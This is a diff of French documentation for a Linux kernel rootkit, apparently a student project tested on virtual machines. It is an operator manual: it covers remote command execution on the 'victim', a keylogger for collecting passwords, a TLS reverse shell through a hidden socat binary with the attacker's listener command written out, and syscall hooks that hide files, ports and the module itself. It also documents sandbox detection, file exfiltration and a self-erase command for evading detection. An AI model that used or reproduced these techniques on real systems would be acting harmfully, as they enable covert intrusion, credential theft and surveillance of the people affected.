@@ -43,7 +43,7 @@ Normalement, à ce stade, vous devriez avoir les deux machines virtuelles ouvert
 </figure>
 \endhtmlonly
 
-### 2. Dashboard
+### 2. Dashboard {#dashboard}
 
 \htmlonly
 <figure style="text-align: center;">
@@ -164,7 +164,7 @@ Les résultats de l'exécution apparaissent dans deux blocs distincts :
 
 En bas de l’écran, une section intitulée *Command history* permet de consulter les commandes précédemment envoyées à la machine cible. Chaque commande est accompagnée de son résultat, affiché dans un bloc repliable afin de préserver la lisibilité de l’interface. Cette fonctionnalité facilite à la fois le suivi des actions réalisées, le débogage en cas de problème, et la réutilisation rapide de commandes fréquentes.
 
-### 4. Keylogger
+### 4. Keylogger {#keylogger}
 
 L’onglet **Keylogger** permet de récupérer les frappes clavier effectuées sur la machine victime. Cette fonctionnalité est particulièrement utile pour collecter des mots de passe, des requêtes tapées dans un navigateur, ou encore pour surveiller l’activité de la victime.
 \htmlonly
@@ -192,214 +192,645 @@ Un champ de recherche permet de filtrer dynamiquement les résultats affichés. 
 #### 📦 Exportation
 Le bouton *Download as .txt* permet de télécharger l’ensemble des frappes capturées sous forme d’un fichier `.txt` directement sur la machine attaquante.
 
-## 🚀 Commandes
+---
 
-Voici l'ensemble des commandes que nous pouvons utiliser via le terminal, soit dans l'interface web, soit en ligne de commande. La partie **hooks** implémente également un sous-menu de commandes.
+## 📜 Commandes disponibles
 
-### 1. 🆘 help
+<details open>
+<summary id="help"><b>1. 🆘 help</b></summary>
+
+**Syntaxe**
 ```bash
 help
 ```
-Cette commande permet simplement d’afficher un menu récapitulatif de toutes les commandes disponibles pour l’attaquant. Certaines commandes affichées ont plus de sens et sont surtout utilisées dans le cadre de l’interface Web.
 
-### 2. 🔌 connect
+**Description**  
+Affiche un menu récapitulatif de toutes les commandes disponibles pour l'attaquant. Certaines commandes affichées sont optimisées pour l'interface Web.
+
+</details>
+
+<details open>
+<summary id="connect"><b>2. 🔌 connect</b></summary>
+
+**Syntaxe**
 ```bash
 connect [PASSWORD]
 ```
-Cette commande permet d’authentifier l’attaquant pour pouvoir accéder au rootkit à distance. Le mot de passe peut ensuite être changé avec la commande `passwd`.
 
-### 3. 🔌 disconnect
+**Description**  
+Permet d'authentifier l'attaquant pour accéder au rootkit à distance.
+
+**Paramètres**
+- **PASSWORD** : Mot de passe d'authentification
+
+**Notes importantes**
+- La connexion est nécessaire pour exécuter d'autres commandes
+- Seules les commandes <a href="#help">help</a>, <a href="#connect">connect</a> et <a href="#ping">ping</a> sont accessibles sans authentification
+- Le mot de passe peut être modifié ultérieurement avec la commande <a href="#passwd">passwd</a>
+</details>
+
+<details open>
+<summary id="disconnect"><b>3. 🔌 disconnect</b></summary>
+
+**Syntaxe**
 ```bash
 disconnect
 ```
-Cette commande est le complément de `connect` : elle permet de se déconnecter du rootkit distant. Il faudra donc se reconnecter pour pouvoir entrer de nouvelles commandes.
 
-### 4. 📡 ping
+**Description**  
+Commande complémentaire de <a href="#connect">connect</a>. Permet de se déconnecter proprement du rootkit distant.
+
+**Comportement**
+- Une reconnexion sera nécessaire pour saisir de nouvelles commandes
+- Ne termine pas l'execution du rootkit contrairement à <a href="#killcom">killcom</a>.
+
+</details>
+
+<details open>
+<summary id="ping"><b>4. 📡 ping</b></summary>
+
+**Syntaxe**
 ```bash
 ping
 ```
-Cette commande permet de tester la connectivité du rootkit. Si la connexion est établie, la console devrait renvoyer `pong`.
 
-### 5. 🔐 passwd
+**Description**  
+Teste la connectivité du rootkit.
+
+**Réponse attendue**
+- **Succès** : La console renvoie `pong`
+- **Échec** : Aucune réponse ou erreur de connexion
+
+</details>
+
+<details open>
+<summary id="passwd"><b>5. 🔐 passwd</b></summary>
+
+**Syntaxe**
 ```bash
 passwd [PASSWORD]
 ```
-Cette commande permet de changer le mot de passe actuellement utilisé pour se connecter au rootkit. Une fois le mot de passe modifié, il sera haché et stocké en interne sur la machine victime.
+
+**Description**  
+Modifie le mot de passe actuellement utilisé pour se connecter au rootkit.
+
+**Paramètres**
+- **PASSWORD** : Nouveau mot de passe
+
+**Fonctionnement**
+- Le mot de passe est haché automatiquement
+- Stockage sécurisé en interne sur la machine victime
 
 **Exemple**
 ```bash
 passwd root
 ```
 
-### 6. 🖥️ exec
+</details>
+
+<details open>
+<summary id="exec"><b>6. 🖥️ exec</b></summary>
+
+**Syntaxe**
 ```bash
 exec [OPTIONS] [COMMAND]
 ```
-Cette commande permet d'exécuter du code Bash dans l’espace utilisateur (userland) de la machine victime. Par défaut, elle renvoie le contenu de *stdout*, *stderr* ainsi que le code de sortie. Pour éviter cette sortie, il est possible d’ajouter l’option `-s`. Une fois exécutée, la commande se comporte comme si le code Bash était directement saisi dans le terminal de la victime.
+
+**Description**  
+Exécute du code Bash dans l'espace utilisateur (userland) de la machine victime.
+
+**Options**
+- **-s** : Mode silencieux (évite l'affichage de la sortie, retourne uniquement le code de retour)
+
+**Sortie par défaut**
+- Contenu de *stdout*
+- Contenu de *stderr*  
+- Code de retour de la commande
 
 **Exemples**
 ```bash
-exec ls
-exec man man
-exec -s whoami
-exec ping 8.8.8.8 
+exec ls                    # Liste les fichiers
+exec man man              # Affiche le manuel
+exec -s whoami            # Mode silencieux
+exec ping 8.8.8.8         # Test de connectivité
 ```
 
-### 7. 👁️ klgon
+</details>
+
+<details open>
+<summary id="klgon"><b>7. 👁️ klgon</b></summary>
+
+**Syntaxe**
 ```bash
 klgon
 ```
 
-### 8. 👁️ klgoff
+**Description**  
+Active le keylogger sur la machine victime.
+
+**Fonctionnement**
+- Enregistrement de toutes les frappes clavier
+- Fonctionnement en arrière-plan
+- Stockage des données pour récupération ultérieure
+
+> **Note** : Utilisation du keylogger possible directement depuis l’onglet [Keylogger](#keylogger) de l'interface web.
+
+</details>
+
+<details open>
+<summary id="klgoff"><b>8. 👁️ klgoff</b></summary>
+
+**Syntaxe**
 ```bash
 klgoff
 ```
 
-### 9. 📝 klg
+**Description**  
+Désactive le keylogger sur la machine victime.
+
+**Effet**
+- Arrêt immédiat de l'enregistrement des frappes
+- Les données déjà collectées restent disponibles
+
+> **Note** : Utilisation du keylogger possible directement depuis l’onglet [Keylogger](#keylogger) de l'interface web.
+
+</details>
+
+<details open>
+<summary id="klg"><b>9. 📝 klg</b></summary>
+
+**Syntaxe**
 ```bash
 klg
 ```
 
-### 10. 🐚 getshell
+**Description**  
+Récupère les frappes clavier enregistrées par le keylogger.
+
+**Format de sortie**
+- **Contenu brut** sans mise en forme
+- **Touches spéciales** représentées par des chaînes spécifiques
+  - Exemple : `_LSHIFT_` pour la touche Majuscule gauche
+
+> **Note** : Utilisation du keylogger et fonctionnalitées avancées disponibles directement depuis l’onglet [Keylogger](#keylogger) de l'interface web.
+
+</details>
+
+<details open>
+<summary id="getshell"><b>10. 🐚 getshell</b></summary>
+
+**Syntaxe**
 ```bash
-getshell
+getshell [port]
 ```
 
-### 11. 💀 killcom
+**Description**  
+Ouvre un shell inversé (reverse shell) sécurisé sur la machine cible en utilisant une connexion TCP+SSL.
+
+**Paramètres**
+- **port** *(optionnel)* : Port de connexion personnalisé
+  - **Défaut** : `9001`
+  - **Exemple** : `getshell 9042` utilise le port 9042
+
+**Fonctionnement technique**  
+Le reverse shell utilise un binaire **socat** compilé statiquement, intégré au module rootkit :
+
+1. **Déploiement** : Le binaire est installé dans `/var/lib/systemd/.epirootkit-hidden-fs/.sysd` lors de l'insertion du module
+2. **Connexion** : Établissement d'une connexion TCP+SSL vers l'attaquant sur le port spécifié
+3. **Exécution** : L'attaquant peut exécuter des commandes à distance comme s'il était connecté localement
+4. **Interactivité** : Shell complètement interactif grâce aux paramètres d'exécution spécifiques du binaire
+
+**Configuration côté attaquant**  
+L'attaquant doit avoir une instance socat en écoute avec le certificat SSL correspondant :
+
+```bash
+socat openssl-listen:9042,reuseaddr,cert="$(pwd)"/server.pem,verify=0 file:"$(tty)",raw,echo=0
+```
+
+**Interface web**  
+Dans l'interface web :
+- Spécifiez le port dans le champ dédié
+- Le serveur socat est lancé automatiquement en arrière-plan en utilisant le terminal **Kitty**
+- Cliquez sur le bouton **Launch Shell** pour ouvrir le shell inversé
+
+> **Note** : Le reverse shell est disponible directement depuis l’onglet **Shell** du [Dashboard](#dashboard) de l'interface web.
+
+</details>
+
+<details open>
+<summary id="killcom"><b>11. 💀 killcom</b></summary>
+
+**Syntaxe**
 ```bash
 killcom
 ```
-Cette commande est relativement intrusive : elle coupe la communication avec le rootkit et supprime le module via `rmmod`. Elle est principalement utilisée à des fins de test et de développement, car en conditions réelles, on ne souhaiterait pas nécessairement détruire le module. Si l’objectif est uniquement de déconnecter proprement l’attaquant, utilisez plutôt la commande `disconnect`.
 
-### 12. 🙈 hide_module
+**Description**  
+Coupe la communication avec le rootkit et supprime le module via `rmmod`.
+
+**Usage recommandé**
+- **Développement et tests** uniquement
+- **Production** : Utilisez plutôt `disconnect` pour une déconnexion simple.
+
+**Effet destructeur**  
+⚠️ **Attention** : Cette commande détruit complètement le module, nécessitant une réinstallation sur la machine victime pour le réactiver.
+
+> **Note :**  
+> S'il venait à arriver que le rootkit soit détecté par des outils spécialisés (par exemple par la DGSI ou Laurence C. ), la commande `killcom` peut alors s'avérer d'une grande utilité afin de supprimer toute trace du rootkit et disparaitre tel XDDL.
+
+
+</details>
+
+<details open>
+<summary id="hide_module"><b>12. 🙈 hide_module</b></summary>
+
+**Syntaxe**
 ```bash
 hide_module
 ```
-Cette commande permet de masquer le module noyau en le retirant de la liste chaînée des modules maintenue par le noyau Linux, le rendant ainsi indétectable par les outils système classiques.
 
-### 13. 👀 unhide_module
+**Description**  
+Masque le module noyau en le retirant de la liste chaînée des modules maintenue par le noyau Linux.
+
+**Avantages**
+- Indétectable par les outils système classiques
+- Persistance accrue du rootkit
+- Contournement des outils de détection standards
+
+</details>
+
+<details open>
+<summary id="unhide_module"><b>13. 👀 unhide_module</b></summary>
+
+**Syntaxe**
 ```bash
 unhide_module
 ```
-Cette commande est l’inverse de la précédente : elle permet de rétablir un module précédemment masqué en le réinsérant dans la liste des modules du noyau.
 
-### 14. 📥 get_file
+**Description**  
+Opération inverse de [`hide_module`](#hide_module). Rétablit le module précédemment masqué en le réinsérant dans la liste des modules du noyau.
+
+**Usage**
+- Permet la visibilité temporaire du module
+- Utile pour narguer les outils de détection lorque la partie de cache-cache est trop longue
+
+</details>
+
+<details open>
+<summary id="get_file"><b>14. 📥 get_file</b></summary>
+
+**Syntaxe**
 ```bash
-get_file
+get_file ######### TODO #########
 ```
 
-### 15. 📤 upload
+**Description**  
+- Permet de transférer un fichier de la machine victime vers la machine attaquante.
+- Fonctionne de manière sécurisée en utilisant le protocole TCP+SSL.
+
+**Fonctionnalités probables**
+- Exfiltration de données
+
+</details>
+
+<details open>
+<summary id="upload"><b>15. 📤 upload</b></summary>
+
+**Syntaxe**
 ```bash
-upload
+upload ######### TODO #########
 ```
 
-### 16. 🧠 sysinfo
+**Description**  
+- Permet de transférer un fichier de la machine attaquante vers la machine victime.
+- Fonctionne de manière sécurisée en utilisant le protocole TCP+SSL.
+
+**Fonctionnalités probables**
+- Déploiement d'outils supplémentaires
+- Installation de payloads
+- Mise à jour du rootkit
+- Transfert de fichiers de configuration
+
+</details>
+
+<details open>
+<summary id="sysinfo"><b>16. 🧠 sysinfo</b></summary>
+
+**Syntaxe**
 ```bash
 sysinfo
 ```
 
-### 17. 🖥️ is_in_vm
+**Description**  
+- Affiche les informations système de la machine victime.
+
+**Informations retournées**
+- **architecture** : Architecture processeur
+- **cpu_cores** : Nombre de cœurs CPU
+- **cpu_model** : Modèle du processeur
+- **hostname** : Nom d’hôte de la machine
+- **ram_mb** : Quantité de RAM en Mo
+- **release** : Version du noyau Linux
+- **system** : Système d’exploitation
+- **version** : Détail complet du noyau
+- **virtual_env** : Indique si la machine est virtualisée
+
+**Exemple de sortie**
+```yaml
+architecture: x86_64
+cpu_cores: 1
+cpu_model: QEMU Virtual CPU version 2.5+
+hostname: victim
+ram_mb: 3889
+release: 6.8.0-58-generic
+system: Linux
+version: "#60~22.04.1-Ubuntu SMP PREEMPT_DYNAMIC Fri Mar 28 16:09:21 UTC 2"
+virtual_env: true
+```
+</details>
+
+<details open>
+<summary id="is_in_vm"><b>17. 🖥️ is_in_vm</b></summary>
+
+**Syntaxe**
 ```bash
 is_in_vm
 ```
-Cette commande permet de détecter si le rootkit s'exécute dans un environnement virtualisé, tel qu’un hyperviseur ou un logiciel de virtualisation.
 
-### 18. 🪝 hooks
+**Description**  
+- Détecte si le rootkit s'exécute dans un environnement virtualisé.
 
-Cette commande permet en réalité d’accéder à un sous-menu de commandes, spécifiquement dédié à l’interception des appels système (syscalls) sur la machine victime. Ainsi, toutes les commandes suivantes doivent être précédées de `hooks` pour fonctionner correctement. Ces fonctionnalité sont persistantes, donc ne sont pas affectées par un redémarrage du système ou une déconnexion, du moment que le module est inseré. En effet, des fichiers de configuration sont recupérés à chaque insertions et mis à jour régulièrement pour maintenir le comportement des alterations.
+**Détection possible**
+- Hyperviseurs (VMware, VirtualBox, Hyper-V)
+- Conteneurs Docker
+- Machines virtuelles cloud
+- Environnements de sandboxing
 
-#### a. help
+**Utilité**
+- Adaptation du comportement selon l'environnement
+- Évasion des analyses en bac à sable
+
+</details>
+
+<details open>
+<summary id="hooks"><b>18. 🪝 Hooks</b></summary>
+
+**Vue d'ensemble des Hooks**
+
+**Description générale**  
+Le système de hooks permet d'intercepter les appels système (syscalls) sur la machine victime. Toutes les commandes de cette section doivent être précédées de `hooks`.
+
+**Fonctionnement**  
+Des fichiers de configuration sont récupérés à chaque insertion du module et mis à jour régulièrement pour maintenir le comportement des altérations.
+
+> ⚠️ **Important**  
+> - Les fonctionnalités sont **persistantes**  
+> - Non affectées par un redémarrage système  
+> - Maintenues tant que le module est inséré  
+> - Configuration sauvegardée et rechargée automatiquement  
+
+**Commandes Hooks disponibles**
+
+<details open>
+<summary id="hooks-help"><b>hooks help</b></summary>
+
+**Syntaxe**
 ```bash
 hooks help
 ```
-Cette commande permet simplement d’afficher un menu récapitulatif de toutes les commandes `hooks` disponibles pour l’attaquant.
 
-#### b. hide
+**Description**  
+Affiche un menu récapitulatif de toutes les commandes `hooks` disponibles.
+
+</details>
+
+<details open>
+<summary id="hooks-hide"><b>hooks hide</b></summary>
+
+**Syntaxe**
 ```bash
 hooks hide [PATH]
 ```
-Cette commande permet de masquer un fichier ou un dossier spécifique en fournissant son chemin absolu. En arrière-plan, le syscall `getdents64` est intercepté afin de filtrer le contenu affiché lors de l’énumération des fichiers. De plus, par défaut, tout fichier commençant par `stdbool_bypassed_ngl_` sera automatiquement caché.
 
-#### c. unhide
+**Description**  
+Masque un fichier ou un dossier spécifique en fournissant son chemin absolu.
+
+**Fonctionnement technique**
+- Interception du syscall `getdents64`
+- Filtrage du contenu lors de l'énumération des fichiers
+- Masquage automatique des fichiers commençant par `stdbool_bypassed_ngl_`
+
+**Paramètres**
+- **PATH** : Chemin absolu du fichier/dossier à masquer
+
+</details>
+
+<details open>
+<summary id="hooks-unhide"><b>hooks unhide</b></summary>
+
+**Syntaxe**
 ```bash
 hooks unhide [PATH]
 ```
-Cette commande annule l’effet de la commande `hooks hide` en rendant à nouveau visible le fichier ou dossier ciblé.
 
-#### e. list_hide
+**Description**  
+Annule l'effet de la commande `hooks hide` en rendant à nouveau visible le fichier ou dossier ciblé.
+
+**Paramètres**
+- **PATH** : Chemin absolu du fichier/dossier à révéler
+
+</details>
+
+<details open>
+<summary id="hooks-list_hide"><b>hooks list_hide</b></summary>
+
+**Syntaxe**
 ```bash
 hooks list_hide
 ```
-Cette commande affiche la liste complète des chemins absolus de tous les fichiers et répertoires ayant été masqués à l’aide de la commande `hooks hide`.
 
-#### f. forbid
+**Description**  
+Affiche la liste complète des chemins absolus de tous les fichiers et répertoires masqués.
+
+**Utilité**
+- Audit des éléments cachés
+- Gestion centralisée des masquages
+
+</details>
+
+<details open>
+<summary id="hooks-forbid"><b>hooks forbid</b></summary>
+
+**Syntaxe**
 ```bash
 hooks forbid [PATH]
 ```
-Cette commande permet d’interdire l’accès à un fichier ou à un dossier, sans pour autant le masquer, même pour un utilisateur disposant des privilèges superutilisateur. Les appels système `openat`, `newfstatat`, `fstat`, `lstat`, `stat` et `chdir` sont interceptés et renvoient l’erreur `-ENOENT` (*No such file or directory*), comme si l’élément n’existait pas.
 
-#### g. unforbid
+**Description**  
+Interdit l'accès à un fichier ou dossier sans le masquer, même pour l'utilisateur root.
+
+**Syscalls interceptés**
+- `openat`, `newfstatat`, `fstat`, `lstat`, `stat`, `chdir`
+
+**Comportement**  
+Retourne l'erreur `-ENOENT` (*No such file or directory*) comme si l'élément n'existait pas.
+
+**Paramètres**
+- **PATH** : Chemin absolu du fichier/dossier à interdire
+
+</details>
+
+<details open>
+<summary id="hooks-unforbid"><b>hooks unforbid</b></summary>
+
+**Syntaxe**
 ```bash
 hooks unforbid [PATH]
 ```
-Cette commande annule l’effet de la commande précédente. 
 
-#### h. list_forbid
+**Description**  
+Annule l'effet de la commande `hooks forbid`.
+
+**Paramètres**
+- **PATH** : Chemin absolu du fichier/dossier à débloquer
+
+</details>
+
+<details open>
+<summary id="hooks-list_forbid"><b>hooks list_forbid</b></summary>
+
+**Syntaxe**
 ```bash
 hooks list_forbid
 ```
-Cette commande affiche la liste complète des chemins absolus de tous les fichiers et répertoires ayant été interdits à l’aide de la commande `hooks forbid`.
 
-#### i. modify
+**Description**  
+Affiche la liste complète des chemins absolus de tous les fichiers et répertoires interdits.
+
+</details>
+
+<details open>
+<summary id="hooks-modify"><b>hooks modify</b></summary>
+
+**Syntaxe**
 ```bash
 hooks modify [PATH] [hide_line=N] [hide_substr=TXT] [replace=SRC:DST]
 ```
 
-Cette commande correspond à l’interception de l’appel système read(). Elle permet, pour n’importe quel fichier, de :
-- cacher une ligne précise,
-- cacher les lignes contenant un mot-clé,
-- remplacer certains mots-clés par d'autres.
+**Description**  
+Interception de l'appel système `read()` permettant de modifier dynamiquement le contenu des fichiers.
 
-Bien entendu, il ne s’agit pas d’une fonctionnalité particulièrement utile dans le cadre d’un rootkit, mais elle permet de démontrer concrètement la plupart des manipulations possibles à l’aide de hooks. Cela dit, cette commande reste délicate à utiliser, notamment en présence de fichiers très longs, ce qui peut entraîner des comportements imprévus... Pour l’utiliser et la tester, il faut respecter le modèle présenté ci-dessus, en précisant les paramètres `hide_line`, `hide_substr` ou `replace` uniquement lorsque cela est nécessaire. Comme pour les autres commandes, le chemin du fichier doit être absolu. Le fonctionnement est également assez primitif, car les espaces ne sont pas pris en charge.
+**Fonctionnalités**
+- **Masquer une ligne précise** : `hide_line=N`
+- **Masquer les lignes contenant un mot-clé** : `hide_substr=TXT`
+- **Remplacer des mots-clés** : `replace=SRC:DST`
+
+**Paramètres**
+- **PATH** : Chemin absolu du fichier (obligatoire)
+- **hide_line** : Numéro de ligne à masquer
+- **hide_substr** : Sous-chaîne à masquer dans toutes les lignes
+- **replace** : Remplacement au format `source:destination`
+
+**Limitations**  
+⚠️ **Attention** :
+- Comportement imprévisible avec des fichiers très longs
+- Les espaces ne sont pas pris en charge
+- Fonctionnement primitif
 
 **Exemples**
 ```bash
-modify /home/victim/test.txt hide_line=3 hide_substr=claire replace=efrei:epita
-modify /home/victim/test.txt hide_substr=claire replace=efrei:epita
-modify /home/victim/test.txt replace=efrei:epita hide_substr=claire
-modify /home/victim/test.txt hide_substr=claire hide_line=10
-modify /home/victim/test.txt hide_line=1
+hooks modify /home/victim/test.txt hide_line=3 hide_substr=claire replace=efrei:epita
+hooks modify /home/victim/test.txt hide_substr=claire replace=efrei:epita
+hooks modify /home/victim/test.txt replace=efrei:epita hide_substr=claire
+hooks modify /home/victim/test.txt hide_substr=claire hide_line=10
+hooks modify /home/victim/test.txt hide_line=1
 ```
 
-#### j. unmodify
+</details>
+
+<details open>
+<summary id="hooks-unmodify"><b>hooks unmodify</b></summary>
+
+**Syntaxe**
 ```bash
 hooks unmodify [PATH]
 ```
-Cette commande annule l’effet de la commande précédente. Elle prend en compte uniquement le chemin absolu pour supprimer l'entrée.
 
-#### k. list_modify
+**Description**  
+Annule l'effet de la commande `hooks modify`.
+
+**Paramètres**
+- **PATH** : Chemin absolu du fichier à restaurer
+
+</details>
+
+<details open>
+<summary id="hooks-list_modify"><b>hooks list_modify</b></summary>
+
+**Syntaxe**
 ```bash
 hooks list_modify
 ```
-Cette commande affiche la liste complète des chemins absolus de tous les fichiers et répertoires ayant été modifiés à l’aide de la commande `hooks modify`.
 
-#### l. add_port
+**Description**  
+Affiche la liste complète des chemins absolus de tous les fichiers modifiés.
+
+</details>
+
+<details open>
+<summary id="hooks-add_port"><b>hooks add_port</b></summary>
+
+**Syntaxe**
 ```bash
 hooks add_port [PORT]
 ```
-Cette commande permet de cacher des ports, notamment dans les fichiers `/proc/net/tcp`... Elle modifie également le comportement de binaires comme `ss` ou `netstat`, en masquant toutes les lignes mentionnant un port source ou destination égal à `[PORT]`.
 
-#### m. remove_port
+**Description**  
+Masque des ports spécifiques dans les fichiers système et les outils réseau.
+
+**Cibles affectées**
+- Fichiers `/proc/net/tcp*`
+- Commandes `ss`
+- Commandes `netstat`
+
+**Comportement**  
+Masque toutes les lignes mentionnant un port source ou destination égal à `[PORT]`.
+
+**Paramètres**
+- **PORT** : Numéro de port à masquer
+
+</details>
+
+<details open>
+<summary id="hooks-remove_port"><b>hooks remove_port</b></summary>
+
+**Syntaxe**
 ```bash
 hooks remove_port [PORT]
 ```
-Cette commande annule l’effet de la commande précédente.
 
-#### n. list_port
+**Description**  
+Annule l'effet de la commande `hooks add_port`.
+
+**Paramètres**
+- **PORT** : Numéro de port à révéler
+
+</details>
+
+<details open>
+<summary id="hooks-list_port"><b>hooks list_port</b></summary>
+
+**Syntaxe**
 ```bash
 hooks list_port
 ```
-Cette commande affiche la liste complète de tous les ports cachés.
+
+**Description**  
+Affiche la liste complète de tous les ports actuellement masqués.
+
+</details>
+
+</details>
 
 <img 
   src="logo_no_text.png" 
